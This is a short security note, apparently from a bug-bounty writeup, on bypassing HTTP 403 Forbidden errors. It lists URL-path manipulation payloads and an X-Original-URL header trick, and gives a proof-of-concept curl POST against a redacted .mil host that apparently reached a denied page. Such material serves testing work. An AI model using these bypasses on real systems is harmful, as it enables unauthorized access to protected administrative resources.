For ex, if 
example.com/admin = 403
Then try

example.com/%2e/admin
example.com/admin..;/
example.com/aDMin
example.com/admin.
example.com/admin/./

Use can try "X-Original-URL"



Proof-of-Concept
For exploit write this command.
Exploited command: curl -H "Content-Length:0" -X POST https://www.███████.mil/██████████
Denied command: curl -X GET https://www.███████.mil/██████






How to bypass an error 403 forbidden?
The 403 Forbidden status indicates that the client was able to communicate with the server, but the server won't let the client access what was requested.
I know that many things can trigger 403 errors like WAFs, IDS, supported .htcaccess file etc.
and these are my approach and general methods to bypass it.
